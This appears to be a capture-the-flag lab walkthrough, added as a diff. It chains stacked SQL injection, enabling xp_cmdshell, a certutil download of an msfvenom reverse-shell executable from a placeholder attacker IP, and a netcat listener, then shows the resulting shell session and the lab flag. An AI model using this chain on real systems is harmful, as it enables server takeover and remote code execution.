@@ -1,0 +1,317 @@
+
+SQL Stacked Queries
+http://web/giftresults.php?age=' OR 1=1 --
+http://web/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+http://web/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+http://website/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
+
+
+
+CMD/Linux syntax
+The below was incorrect as (like an idiot) I forgot to add the correct LHOST.
+root@ip-10-10-3-198:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
+^Z
+[1]+  Stopped                 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
+
+This was correct!
+root@ip-10-10-3-198:~# msfvenom -p windows/x64/shell_reverse_tcp XXXXXXXX LPORT=4444 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+root@ip-10-10-3-198:~# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.242.228 - - [19/Dec/2023 15:02:07] "GET /reverse.exe HTTP/1.1" 200 -
+10.10.242.228 - - [19/Dec/2023 15:02:07] "GET /reverse.exe HTTP/1.1" 200 -
+
+
+
+Set up a netcat listener to gain Reverse shell
+
+root@ip-10-10-3-198:~# nc -lnvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.242.228 49893 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt service\mssql$sqlexpress
+
+C:\Windows\system32>pwd
+pwd
+'pwd' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Windows
+
+10/03/2023  05:27 PM    <DIR>          .
+10/03/2023  05:27 PM    <DIR>          ..
+09/15/2018  07:19 AM    <DIR>          ADFS
+09/15/2018  07:19 AM    <DIR>          appcompat
+10/14/2020  03:50 AM    <DIR>          apppatch
+03/17/2021  03:19 PM    <DIR>          AppReadiness
+10/03/2023  06:27 PM    <DIR>          assembly
+09/15/2018  07:19 AM    <DIR>          bcastdvr
+10/14/2020  03:46 AM            79,360 bfsvc.exe
+09/15/2018  07:19 AM    <DIR>          Boot
+09/15/2018  07:19 AM    <DIR>          Branding
+10/03/2023  06:17 PM    <DIR>          CbsTemp
+09/15/2018  07:19 AM    <DIR>          Containers
+09/15/2018  07:19 AM    <DIR>          Cursors
+12/12/2018  08:38 AM    <DIR>          debug
+06/12/2019  06:42 AM           232,960 DfsrAdmin.exe
+06/12/2019  06:44 AM             1,315 DfsrAdmin.exe.config
+09/15/2018  07:19 AM    <DIR>          diagnostics
+09/15/2018  09:07 AM    <DIR>          DigitalLocker
+09/09/2020  03:39 AM           219,754 DPINST.LOG
+09/15/2018  07:19 AM    <DIR>          drivers
+03/17/2021  02:57 PM            67,326 DtcInstall.log
+09/15/2018  09:07 AM    <DIR>          en-US
+01/13/2021  09:15 PM         4,441,288 explorer.exe
+09/15/2018  07:19 AM    <DIR>          Globalization
+09/15/2018  09:07 AM    <DIR>          Help
+01/13/2021  09:16 PM         1,072,128 HelpPane.exe
+09/15/2018  07:12 AM            18,432 hh.exe
+09/15/2018  07:19 AM    <DIR>          IdentityCRL
+10/03/2023  06:17 PM            35,733 iis.log
+01/13/2021  09:21 PM    <DIR>          IME
+03/11/2021  09:20 AM    <DIR>          ImmersiveControlPanel
+11/02/2023  08:36 PM    <DIR>          INF
+09/15/2018  07:19 AM    <DIR>          InputMethod
+09/15/2018  07:19 AM    <DIR>          L2Schemas
+09/15/2018  07:19 AM    <DIR>          LiveKernelReports
+10/12/2023  03:59 PM    <DIR>          Logs
+11/15/2018  12:04 AM             1,380 lsasetup.log
+09/15/2018  07:12 AM            43,131 mib.bin
+12/19/2023  02:07 PM    <DIR>          Microsoft.NET
+09/15/2018  07:19 AM    <DIR>          Migration
+09/15/2018  07:19 AM    <DIR>          ModemLogs
+01/13/2021  09:15 PM           254,464 notepad.exe
+09/15/2018  09:08 AM    <DIR>          OCR
+09/15/2018  07:19 AM    <DIR>          Offline Web Pages
+03/17/2021  02:59 PM    <DIR>          Panther
+09/15/2018  07:19 AM    <DIR>          Performance
+10/12/2023  03:43 PM         1,676,338 PFRO.log
+09/15/2018  07:19 AM    <DIR>          PLA
+02/10/2021  02:30 AM    <DIR>          PolicyDefinitions
+11/15/2018  12:05 AM    <DIR>          Prefetch
+01/13/2021  09:21 PM    <DIR>          PrintDialog
+09/15/2018  07:19 AM    <DIR>          Provisioning
+01/13/2021  09:16 PM           357,888 regedit.exe
+09/15/2018  07:19 AM    <DIR>          Registration
+09/15/2018  07:19 AM    <DIR>          RemotePackages
+09/15/2018  07:19 AM    <DIR>          rescache
+09/15/2018  07:19 AM    <DIR>          Resources
+09/15/2018  07:19 AM    <DIR>          SchCache
+09/15/2018  07:19 AM    <DIR>          schemas
+09/15/2018  07:19 AM    <DIR>          security
+09/15/2018  07:13 AM            30,914 ServerDataCenter.xml
+10/03/2023  05:35 PM    <DIR>          ServiceProfiles
+11/15/2018  12:05 AM    <DIR>          ServiceState
+03/17/2021  03:15 PM    <DIR>          servicing
+11/14/2018  06:55 AM    <DIR>          Setup
+03/18/2020  06:47 AM    <DIR>          ShellComponents
+03/17/2021  03:32 PM    <DIR>          ShellExperiences
+09/15/2018  07:19 AM    <DIR>          SKB
+03/17/2021  03:08 PM    <DIR>          SoftwareDistribution
+09/15/2018  07:19 AM    <DIR>          Speech
+09/15/2018  07:19 AM    <DIR>          Speech_OneCore
+01/13/2021  09:15 PM           133,632 splwow64.exe
+09/15/2018  07:19 AM    <DIR>          System
+09/15/2018  07:16 AM               219 system.ini
+12/19/2023  02:01 PM    <DIR>          System32
+09/15/2018  07:19 AM    <DIR>          SystemApps
+09/15/2018  07:19 AM    <DIR>          SystemResources
+10/03/2023  07:26 PM    <DIR>          SysWOW64
+09/15/2018  07:19 AM    <DIR>          TAPI
+11/15/2018  12:05 AM    <DIR>          Tasks
+12/19/2023  03:02 PM    <DIR>          Temp
+03/11/2021  09:20 AM    <DIR>          TextInput
+09/15/2018  07:19 AM    <DIR>          tracing
+09/15/2018  07:19 AM    <DIR>          twain_32
+09/15/2018  07:13 AM            64,512 twain_32.dll
+09/15/2018  07:19 AM    <DIR>          Vss
+09/15/2018  07:19 AM    <DIR>          WaaS
+09/15/2018  07:19 AM    <DIR>          Web
+09/15/2018  07:16 AM                92 win.ini
+12/19/2023  01:57 PM               276 WindowsUpdate.log
+09/15/2018  07:13 AM            11,776 winhlp32.exe
+10/03/2023  06:17 PM    <DIR>          WinSxS
+09/15/2018  07:12 AM           316,640 WMSysPr9.prx
+09/15/2018  07:12 AM            11,264 write.exe
+              23 File(s)      9,070,822 bytes
+              72 Dir(s)  10,493,313,024 bytes free
+
+C:\Windows>cd USERS
+cd USERS
+The system cannot find the path specified.
+
+C:\Windows>cd ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\
+
+11/14/2018  06:56 AM    <DIR>          EFI
+10/12/2023  07:01 PM    <DIR>          inetpub
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+10/03/2023  07:29 PM    <DIR>          PHP
+10/12/2023  03:48 PM    <DIR>          Program Files
+10/03/2023  06:26 PM    <DIR>          Program Files (x86)
+10/03/2023  05:32 PM    <DIR>          SQL2022
+03/17/2021  03:00 PM    <DIR>          Users
+10/03/2023  05:27 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               9 Dir(s)  10,492,264,448 bytes free
+
+C:\>CD C:\Users
+CD C:\Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+03/17/2021  03:00 PM    <DIR>          .
+03/17/2021  03:00 PM    <DIR>          ..
+11/09/2023  07:21 PM    <DIR>          Administrator
+12/12/2018  07:45 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  10,492,264,448 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator
+
+11/09/2023  07:21 PM    <DIR>          .
+11/09/2023  07:21 PM    <DIR>          ..
+03/17/2021  03:13 PM    <DIR>          3D Objects
+03/17/2021  03:13 PM    <DIR>          Contacts
+11/02/2023  08:48 PM    <DIR>          Desktop
+11/02/2023  08:42 PM    <DIR>          Documents
+10/24/2023  12:04 AM    <DIR>          Downloads
+03/17/2021  03:13 PM    <DIR>          Favorites
+03/17/2021  03:13 PM    <DIR>          Links
+03/17/2021  03:13 PM    <DIR>          Music
+03/17/2021  03:13 PM    <DIR>          Pictures
+03/17/2021  03:13 PM    <DIR>          Saved Games
+03/17/2021  03:13 PM    <DIR>          Searches
+03/17/2021  03:13 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,492,264,448 bytes free
+
+C:\Users\Administrator>cd Documents
+cd Documents
+
+C:\Users\Administrator\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Documents
+
+11/02/2023  08:42 PM    <DIR>          .
+11/02/2023  08:42 PM    <DIR>          ..
+11/02/2023  08:42 PM    <DIR>          SQL Server Management Studio
+11/02/2023  08:43 PM    <DIR>          Visual Studio 2017
+               0 File(s)              0 bytes
+               4 Dir(s)  10,492,264,448 bytes free
+
+C:\Users\Administrator\Documents>cd ..
+cd ..
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator
+
+11/09/2023  07:21 PM    <DIR>          .
+11/09/2023  07:21 PM    <DIR>          ..
+03/17/2021  03:13 PM    <DIR>          3D Objects
+03/17/2021  03:13 PM    <DIR>          Contacts
+11/02/2023  08:48 PM    <DIR>          Desktop
+11/02/2023  08:42 PM    <DIR>          Documents
+10/24/2023  12:04 AM    <DIR>          Downloads
+03/17/2021  03:13 PM    <DIR>          Favorites
+03/17/2021  03:13 PM    <DIR>          Links
+03/17/2021  03:13 PM    <DIR>          Music
+03/17/2021  03:13 PM    <DIR>          Pictures
+03/17/2021  03:13 PM    <DIR>          Saved Games
+03/17/2021  03:13 PM    <DIR>          Searches
+03/17/2021  03:13 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              14 Dir(s)  10,492,264,448 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/02/2023  08:48 PM    <DIR>          .
+11/02/2023  08:48 PM    <DIR>          ..
+10/24/2023  01:28 AM    <DIR>          1 
+11/02/2023  08:48 PM    <DIR>          backups
+11/02/2023  08:05 PM               339 deface_website.bat
+10/24/2023  12:03 AM               651 Note.txt
+11/02/2023  08:05 PM               388 restore_website.bat
+               3 File(s)          1,378 bytes
+               4 Dir(s)  10,492,264,448 bytes free
+
+C:\Users\Administrator\Desktop>more Note.txt
+more Note.txt
+====================
+Hey h4ck3r0192,
+
+I recieved your Bitcoin payment, thanks again for a speedy transaction.
+
+After you gain access to the server, you can deface the website by running the deface_website.bat script in C:\Users\Administrator\Desktop. Feel free to dump the database and steal whatever you want.
+
+If you need to revert the changes back to the original site for any reason, just run restore_website.bat from the same directory.
+
+Also, I shouldn't need to mention this, but PLEASE DELETE this Note.txt file after defacing the website! Do NOT let this hack tie back to me.
+
+-Gr33dstr
+
+THM{b06674fedd8dfc28ca75176d3d51409e}
+
+
+C:\Users\Administrator\Desktop>restore_website.bat
+restore_website.bat
+Removing all files and folders from C:\inetpub\wwwroot...
+Website restoration completed. Please refresh the home (/index.php) page to see the changes and obtain your flag!
+
